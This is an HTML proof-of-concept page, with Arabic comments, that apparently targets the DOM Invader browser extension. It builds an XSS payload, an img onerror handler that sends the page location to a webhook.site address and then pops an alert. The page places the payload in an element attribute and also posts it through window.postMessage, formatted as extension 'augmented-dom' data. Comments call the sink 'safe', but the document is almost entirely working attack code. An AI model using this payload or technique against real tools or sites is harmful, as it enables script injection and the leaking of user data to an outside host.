<!DOCTYPE html>
<html>
<head>
    <title>DOM Invader Clean PoC</title>
</head>
<body style="background:#111;color:#0f0;text-align:center;padding-top:100px;font-family:sans-serif;">
    
    <h1>[ DOM Invader - Clean Test ]</h1>
    <p>Safe sink + postMessage only</p>

    <button onclick="trigger()" style="padding:15px 30px;font-size:18px;">
        SEND MESSAGE
    </button>

    <p id="status" style="margin-top:20px;color:#888;">Waiting...</p>

    <script>
        const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";

        function trigger() {

            document.getElementById('status').innerText =
                "Message sent. Check DOM Invader.";

            // payload مش هيتنفذ في الصفحة
            const payload = (field) => `
'); <img src=x onerror="
fetch('${webhook}?field=${field}&loc=' + encodeURIComponent(window.location.href), {mode:'no-cors'});
alert('Execution via: ${field}\\n' + window.location.href);
"> //`;

            // ✅ safe sink (مش بيشغل JS)
            const el = document.createElement("div");
            el.setAttribute("data-test", payload("ATTRIBUTE_SINK"));

            // 👇 DOM Invader هيشوف ده كـ sink
            document.body.appendChild(el);

            // 👇 الرسالة للـ extension
            window.postMessage({
                source: "dom-invader",
                type: "augmented-dom",
                data: {
                    sink: "attribute",
                    value: payload("VALUE"),
                    stackTrace: payload("STACK_TRACE")
                }
            }, "*");

            console.log("Safe sink triggered. No execution in page.");
        }
    </script>

</body>
</html>
